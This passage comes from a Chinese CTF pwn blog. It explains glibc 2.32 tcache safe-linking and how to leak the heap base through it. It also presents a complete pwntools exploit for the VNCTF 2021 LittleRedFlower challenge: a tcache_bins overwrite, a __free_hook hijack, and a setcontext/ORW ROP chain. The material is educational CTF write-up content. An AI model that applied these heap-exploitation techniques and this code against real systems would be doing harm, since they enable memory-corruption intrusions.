<p>出现这两种报错信息的原因都是 <strong>堆块指针未对齐</strong> ，笔者百思不得其解，只好将libc2.32的源码下载下来看看…</p>
<h4 id="glibc-2-31下的-tcache-put-与-tcache-get"><a href="#glibc-2-31下的-tcache-put-与-tcache-get" class="headerlink" title="glibc 2.31下的 tcache_put 与 tcache_get"></a>glibc 2.31下的 tcache_put 与 tcache_get</h4><p>我们先来看看在 <code>glibc 2.31</code> 中是如何操作 tcache 中的堆块的：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e-&gt;next;</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在 <code>glibc2.31</code> 下，堆管理器在 <code>取/放</code> chunk时不会检测 tcache 中的堆块地址的合法性，也没有任何的诸如 <code>加密/解密</code> 等一系列的防护手段，完全就是一个裸的单向链表结构，利用起来易如反掌，只需要一个诸如 <code>UAF</code> 之类的漏洞就可以直接进行任意地址写</p>
<h4 id="glibc-2-32下的-tcache-put-与-tcache-get"><a href="#glibc-2-32下的-tcache-put-与-tcache-get" class="headerlink" title="glibc 2.32下的 tcache_put 与 tcache_get"></a>glibc 2.32下的 tcache_put 与 tcache_get</h4><p>但是在 <code>glibc 2.32</code> 中引入了一个简单的异或加密机制：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s room</span></span><br><span class="line"><span class="comment">   for more chunks.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span></span><br><span class="line"><span class="title function_">tcache_put</span> <span class="params">(mchunkptr chunk, <span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Mark this chunk as &quot;in the tcache&quot; so the test in _int_free will</span></span><br><span class="line"><span class="comment">     detect a double free.  */</span></span><br><span class="line">  e-&gt;key = tcache;</span><br><span class="line"></span><br><span class="line">  e-&gt;next = PROTECT_PTR (&amp;e-&gt;next, tcache-&gt;entries[tc_idx]);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = e;</span><br><span class="line">  ++(tcache-&gt;counts[tc_idx]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Caller must ensure that we know tc_idx is valid and there&#x27;s</span></span><br><span class="line"><span class="comment">   available chunks to remove.  */</span></span><br><span class="line"><span class="type">static</span> __always_inline <span class="type">void</span> *</span><br><span class="line"><span class="title function_">tcache_get</span> <span class="params">(<span class="type">size_t</span> tc_idx)</span></span><br><span class="line">&#123;</span><br><span class="line">  tcache_entry *e = tcache-&gt;entries[tc_idx];</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (!aligned_OK (e)))</span><br><span class="line">    malloc_printerr (<span class="string">&quot;malloc(): unaligned tcache chunk detected&quot;</span>);</span><br><span class="line">  tcache-&gt;entries[tc_idx] = REVEAL_PTR (e-&gt;next);</span><br><span class="line">  --(tcache-&gt;counts[tc_idx]);</span><br><span class="line">  e-&gt;key = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">return</span> (<span class="type">void</span> *) e;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>一、新增了在从 tcache 中取出 chunk 时会检测 chunk 地址是否对齐的保护</p>
<p>二、引入了两个新的宏对 tcache 中<code>存/取</code> chunk 的操作进行了一层保护，即在 new chunk 链接 tcache 中 old chunk 时会进行一次异或运算，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PROTECT_PTR(pos, ptr) \</span></span><br><span class="line"><span class="meta">  ((__typeof (ptr)) ((((size_t) pos) &gt;&gt; 12) ^ ((size_t) ptr)))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> REVEAL_PTR(ptr)  PROTECT_PTR (&amp;ptr, ptr)</span></span><br></pre></td></tr></table></figure>

<p>即 <strong>tcache_entry-&gt;next中存放的chunk地址为与自身地址进行异或运算后所得到的值</strong>， 这就要求我们在利用 tcache_entry 进行任意地址写之前 <strong>需要我们提前泄漏出相应 chunk 的地址，即我们需要提前获得堆基址后才能进行任意地址写</strong>，这给传统的利用方式无疑是增加了不少的难度</p>
<p>不过若是我们能够直接控制 <code>tcache struct</code>，则仍然可以直接进行任意地址写，这是因为在 tcache struct 中存放的仍是未经异或运算的原始 chunk 地址</p>
<h4 id="glibc2-32下堆基址的新泄露方式"><a href="#glibc2-32下堆基址的新泄露方式" class="headerlink" title="glibc2.32下堆基址的新泄露方式"></a>glibc2.32下堆基址的新泄露方式</h4><p>虽然这种简单的异或加密方式给 tcache 提高了不少的安全系数，但是同样也提供给我们新的泄露堆基址的途径</p>
<p>我们不难观察到，在 tcache 的一个 entry 中放入第一个 chunk 时，其同样会对该 entry 中的 “chunk” （NULL）进行异或运算后写入到将放入 tcache 中的 chunk 的 <code>fd</code> 字段，若是我们能够打印该 free chunk 的fd字段，<strong>便能够直接获得未经异或运算的堆上相关地址</strong></p>
<p><img src="https://i.loli.net/2021/03/28/cYVZeEbOkf17xhP.png" alt="image.png"></p>
<p><img src="https://i.loli.net/2021/03/28/AQ1P4EeuXRCOyGo.png" alt="image.png"></p>
<h4 id="what’s-more"><a href="#what’s-more" class="headerlink" title="what’s more?"></a>what’s more?</h4><p>在 <code>fastbin</code> 中似乎也引入了这个机制，但是在普通的 <code>bins</code> 数组中似乎并未引入这个机制…？（研究ing</p>
</blockquote>
<h2 id="VNCTF-2021-hh"><a href="#VNCTF-2021-hh" class="headerlink" title="[VNCTF 2021]hh"></a>[VNCTF 2021]hh</h2><h2 id="VNCTF-2021-LittleRedFlower-stackoverflow-orw"><a href="#VNCTF-2021-LittleRedFlower-stackoverflow-orw" class="headerlink" title="[VNCTF 2021]LittleRedFlower - stackoverflow + orw"></a>[VNCTF 2021]LittleRedFlower - stackoverflow + orw</h2><p>惯例的 <code>checksec</code> ，保护全开</p>
<p><img src="https://i.loli.net/2021/04/05/FTbyp5QsMAruaG1.png" alt="image.png"></p>
<p>拖入 IDA 进行分析</p>
<p>开头 ptctl 限制了系统调用，应该是只能 orw 了，同时还白给了 libc 基址</p>
<p><img src="https://i.loli.net/2021/04/05/JoDKl7kbt14Tzua.png" alt="image.png"></p>
<p>可以往任意地址写1字节</p>
<p><img src="https://i.loli.net/2021/04/05/QXBCzwGuc51M7HA.png" alt="image.png"></p>
<p>接下来是允许在预先分配的一个 0x200 的 chunk 的任意偏移处写 8 字节</p>
<p><img src="https://i.loli.net/2021/04/05/inCTA5SpRfIb9XM.png" alt="image.png"></p>
<p>最后是允许分配一个特定大小的 chunk ，向其写入内容后该 chunk 会被释放，程序执行流结束</p>
<p><img src="https://i.loli.net/2021/04/05/IGWd6i1NlSeCT5n.png" alt="image.png"></p>
<p>考虑到最开始的 chunk 与 tcache struct 是紧挨着的，若是我们能够想办法 “让这个 chunk 的特定偏移处成为 tcache struct 的一部分” ，那么在该偏移的位置写 8 字节时便等同于我们向 tcache struct 内放入了一个 fake chunk，接下来的分配就能够完成任意地址写了</p>
<p>阅读 glibc 源码，我们可以发现 tcache 取 chunk 的逻辑是以 <code>mp_.tcache_bins</code> 作为索引的上限：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (tc_idx &lt; mp_.tcache_bins</span><br><span class="line">    &amp;&amp; tcache</span><br><span class="line">    &amp;&amp; tcache-&gt;counts[tc_idx] &gt; <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> tcache_get (tc_idx);</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>

<p>而结构体 <code>mp_</code> 为静态变量，毫无疑问位于 libc 当中：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="class"><span class="keyword">struct</span> <span class="title">malloc_par</span> <span class="title">mp_</span> =</span></span><br><span class="line">&#123;</span><br><span class="line">  .top_pad = DEFAULT_TOP_PAD,</span><br><span class="line">  .n_mmaps_max = DEFAULT_MMAP_MAX,</span><br><span class="line">  .mmap_threshold = DEFAULT_MMAP_THRESHOLD,</span><br><span class="line">  .trim_threshold = DEFAULT_TRIM_THRESHOLD,</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> NARENAS_FROM_NCORES(n) ((n) * (sizeof (long) == 4 ? 2 : 8))</span></span><br><span class="line">  .arena_test = NARENAS_FROM_NCORES (<span class="number">1</span>)</span><br><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  ,</span><br><span class="line">  .tcache_count = TCACHE_FILL_COUNT,</span><br><span class="line">  .tcache_bins = TCACHE_MAX_BINS,</span><br><span class="line">  .tcache_max_bytes = tidx2usize (TCACHE_MAX_BINS<span class="number">-1</span>),</span><br><span class="line">  .tcache_unsorted_limit = <span class="number">0</span> <span class="comment">/* No limit.  */</span></span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>我们只需要在开头的任意地址写 1 字节时修改 <code>mp_tcache_bins</code> 即可扩大 tcache 索引，接下来便是劫持 <code>__free_hook</code> 进行 orw 的常规流程</p>
<p>寻找 <code>mp_</code> 的偏移可以通过逆向 libc 的方式完成：</p>
<p><img src="https://i.loli.net/2021/04/05/YbqHUBrRL76y8dK.png" alt="image.png"></p>
<p>可以使用通用 gadget + setcontext 完成栈迁移的过程</p>
<p><img src="https://i.loli.net/2021/04/05/MkvaUCY8Ww1lXB6.png" alt="image.png"></p>
<p>最终的 exp 如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">29644</span>) <span class="comment">#process(&#x27;./pwn&#x27;)#</span></span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>) <span class="comment">#ELF(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;)#</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;GIFT: &quot;</span>)</span><br><span class="line">    stdout_addr = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\n&#x27;</span>, drop = <span class="literal">True</span>), <span class="number">16</span>)</span><br><span class="line">    log.info(<span class="string">&#x27;stdout addr leak: &#x27;</span> + <span class="built_in">hex</span>(stdout_addr))</span><br><span class="line">    libc_base = stdout_addr - libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>]</span><br><span class="line">    log.success(<span class="string">&#x27;libc base: &#x27;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    pop_rdi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdi ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rsi_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rsi ; ret&#x27;</span>)).__next__()</span><br><span class="line">    pop_rdx_pop_rbx_ret = libc_base + libc.search(asm(<span class="string">&#x27;pop rdx ; pop rbx ; ret&#x27;</span>)).__next__()</span><br><span class="line"></span><br><span class="line">    fake_frame = SigreturnFrame()</span><br><span class="line">    fake_frame[<span class="string">&#x27;uc_stack.ss_size&#x27;</span>] = libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span></span><br><span class="line">    fake_frame.rdi = <span class="number">0</span></span><br><span class="line">    fake_frame.rsi = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    fake_frame.rdx = <span class="number">0x200</span></span><br><span class="line">    fake_frame.rsp = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">8</span></span><br><span class="line">    fake_frame.rip = libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    flag_addr = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">    orw = <span class="string">b&#x27;./flag\x00&#x27;</span>.ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(flag_addr) + p64(pop_rsi_ret) + p64(<span class="number">4</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;open&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">3</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;read&#x27;</span>])</span><br><span class="line">    orw += p64(pop_rdi_ret) + p64(<span class="number">1</span>) + p64(pop_rsi_ret) + p64(flag_addr) + p64(pop_rdx_pop_rbx_ret) + p64(<span class="number">0x100</span>) + p64(<span class="number">0</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;write&#x27;</span>])</span><br><span class="line"></span><br><span class="line">    payload = p64(libc_base + <span class="number">0x154B20</span>) + p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] + <span class="number">0x28</span>) + p64(<span class="number">0</span>) * <span class="number">2</span> + p64(libc_base + libc.sym[<span class="string">&#x27;setcontext&#x27;</span>] + <span class="number">61</span>)</span><br><span class="line">    payload += <span class="built_in">bytes</span>(fake_frame)</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    p.recvuntil(<span class="string">b&quot;You can write a byte anywhere&quot;</span>)</span><br><span class="line">    p.send(p64(libc_base + <span class="number">0x1ea2d0</span> + <span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;And what?&quot;</span>)</span><br><span class="line">    p.send(p8(<span class="number">0xff</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Offset:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2280</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;Content:&quot;</span>)</span><br><span class="line">    p.send(p64(libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;size:&quot;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0x1600</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&quot;&gt;&gt;&quot;</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    sleep(<span class="number">1</span>)</span><br><span class="line">    p.send(orw)</span><br><span class="line">    p.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    exp()</span><br></pre></td></tr></table></figure>

<p>运行即可获得 flag</p>
<p><img src="https://i.loli.net/2021/04/05/abU9Qhx8lmRS6Ad.png" alt="image.png"></p>
<blockquote>
<p> u1s1笔者个人感觉这一次VNCTF出的题…虽然说能够让人学到新的东西，但是个人感觉部分题质量不大行，好像是为了出题而出题（x）（出题师傅轻点锤QAQ） </p>
<p>引用某个 pwn 👴👴的一句话就是：<img src="https://i.loli.net/2021/04/05/ByoqAIwVWu1sZgS.png" alt="image.png"></p>
</blockquote>
<h1 id="N1BOOK-Pwn"><a href="#N1BOOK-Pwn" class="headerlink" title="N1BOOK - Pwn"></a>N1BOOK - Pwn</h1><h2 id="ROP-ret2csu-ret2libc"><a href="#ROP-ret2csu-ret2libc" class="headerlink" title="ROP - ret2csu + ret2libc"></a>ROP - ret2csu + ret2libc</h2><p>惯例的<code>checksec</code>，只开了NX</p>
<p><img src="https://i.loli.net/2021/03/29/f4lVTuZE5S3gzMi.png" alt="image.png"></p>
<p>拖入IDA进行分析，直接就有一个很大的溢出</p>
<p><img src="https://i.loli.net/2021/03/29/sQNOaThHRcSt6rx.png" alt="image.png"></p>
<p>套板子做题即可，构造exp如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>


      </div>
      
        <div class="prev-or-next">
          <div class="post-foot-next">
            
              <a href="/2000/10/12/NOTE-0XFF-PIECES_KNOWLEDGE/" target="_self">
                <i class="iconfont icon-chevronleft"></i>
                <span>上一页</span>
              </a>
            
          </div>
          <div class="post-attach">
            <span class="post-pubtime">
              <i class="iconfont icon-updatetime" title="更新时间"></i>
              2020-09-08 02:09:30
            </span>
            
                  <span class="post-categories">
                    <i class="iconfont icon-bookmark" title="分类"></i>
                    
                    <span class="span--category">
                      <a href="/categories/CTF/" title="CTF">
                        <b>#</b> CTF
                      </a>
                    </span>
                    
                  </span>
              
                  <span class="post-tags">
                    <i class="iconfont icon-tags" title="标签"></i>
                    
                    <span class="span--tag">
                      <a href="/tags/Pwn/" title="Pwn">
                        <b>#</b> Pwn
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/" title="信息安全">
                        <b>#</b> 信息安全
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%A0%86/" title="堆">
                        <b>#</b> 堆
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/CTF/" title="CTF">
                        <b>#</b> CTF
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Use-After-Free/" title="Use After Free">
                        <b>#</b> Use After Free
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2libc/" title="ret2libc">
                        <b>#</b> ret2libc
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2text/" title="ret2text">
                        <b>#</b> ret2text
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ROP/" title="ROP">
                        <b>#</b> ROP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/" title="栈溢出">
                        <b>#</b> 栈溢出
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2shellcode/" title="ret2shellcode">
                        <b>#</b> ret2shellcode
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/shellcode/" title="shellcode">
                        <b>#</b> shellcode
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E5%A0%86%E9%A3%8E%E6%B0%B4/" title="堆风水">
                        <b>#</b> 堆风水
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/got%E8%A1%A8%E5%8A%AB%E6%8C%81/" title="got表劫持">
                        <b>#</b> got表劫持
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/%E6%A0%88%E8%BF%81%E7%A7%BB/" title="栈迁移">
                        <b>#</b> 栈迁移
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/IO-FILE-hijack/" title="_IO_FILE hijack">
                        <b>#</b> _IO_FILE hijack
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Fastbin-Attack/" title="Fastbin Attack">
                        <b>#</b> Fastbin Attack
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/FSOP/" title="FSOP">
                        <b>#</b> FSOP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Heap-Overflow/" title="Heap Overflow">
                        <b>#</b> Heap Overflow
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Force/" title="House of Force">
                        <b>#</b> House of Force
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Orange/" title="House of Orange">
                        <b>#</b> House of Orange
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/House-of-Spirit/" title="House of Spirit">
                        <b>#</b> House of Spirit
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/off-by-one/" title="off by one">
                        <b>#</b> off by one
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/one-gadget/" title="one_gadget">
                        <b>#</b> one_gadget
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/python/" title="python">
                        <b>#</b> python
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Unlink/" title="Unlink">
                        <b>#</b> Unlink
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Unsorted-bin-Attack/" title="Unsorted bin Attack">
                        <b>#</b> Unsorted bin Attack
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/canary/" title="canary">
                        <b>#</b> canary
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Integer-Overflow/" title="Integer Overflow">
                        <b>#</b> Integer Overflow
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/off-by-null/" title="off by null">
                        <b>#</b> off by null
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/ret2csu/" title="ret2csu">
                        <b>#</b> ret2csu
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/SROP/" title="SROP">
                        <b>#</b> SROP
                      </a>
                    </span>
                    
                    <span class="span--tag">
                      <a href="/tags/Stack-Smashing-Protect-leak/" title="Stack Smashing Protect leak">
                        <b>#</b> Stack Smashing Protect leak
                      </a>
                    </span>
                    
                  </span>
              
          </div>
          <div class="post-foot-prev">
            
              <a href="/2020/11/23/CTF-0X01-ByteCTF2020-pwn/" target="_self">
                <span>下一页</span>
                <i class="iconfont icon-chevronright"></i>
              </a>
            
          </div>
        </div>
      
    </div>
    
  <div id="btn-catalog" class="btn-catalog">
    <i class="iconfont icon-catalog"></i>
  </div>
  <div class="post-catalog hidden" id="catalog">
    <div class="title">目录</div>
    <div class="catalog-content">
      
        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#0x000-%E7%BB%AA%E8%AE%BA"><span class="toc-text">0x000.绪论</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#0x001-0x010"><span class="toc-text">0x001 ~ 0x010</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x001-test-your-nc-nc"><span class="toc-text">0x001.test your nc - nc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x002-rip-ret2text"><span class="toc-text">0x002.rip - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x003-warmup-csaw-2016-ret2text"><span class="toc-text">0x003.warmup_csaw_2016 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x004-pwn1-sctf-2016-ret2text"><span class="toc-text">0x004.pwn1_sctf_2016 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x005-ciscn-2019-n-1-overwrite"><span class="toc-text">0x005.ciscn_2019_n_1 - overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x006-ciscn-2019-c-1-ret2csu-ret2libc"><span class="toc-text">0x006.ciscn_2019_c_1 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x007-OGeek2019-babyrop-ret2libc"><span class="toc-text">0x007.[OGeek2019]babyrop - ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x008-jarvisoj-level0-ret2text"><span class="toc-text">0x008.jarvisoj_level0 - ret2text</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x009-ciscn-2019-en-2-ret2csu-ret2libc"><span class="toc-text">0x009.ciscn_2019_en_2 - ret2csu + ret2libc</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00A-%E7%AC%AC%E4%BA%94%E7%A9%BA%E9%97%B42019-%E5%86%B3%E8%B5%9B-PWN5-fmtstr"><span class="toc-text">0x00A.[第五空间2019 决赛]PWN5 - fmtstr</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00B-get-started-3dsctf-2016-ret2text-ret2shellcode"><span class="toc-text">0x00B.get_started_3dsctf_2016 - ret2text || ret2shellcode</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%951%EF%BC%9Aret2text"><span class="toc-text">解法1：ret2text</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%A7%A3%E6%B3%952%EF%BC%9Aret2shellcode"><span class="toc-text">解法2：ret2shellcode</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00C-ciscn-2019-n-8-overwrite"><span class="toc-text">0x00C.ciscn_2019_n_8 - overwrite</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x00D-not-the-same-3dsctf-2016-ret2shellcode"><span 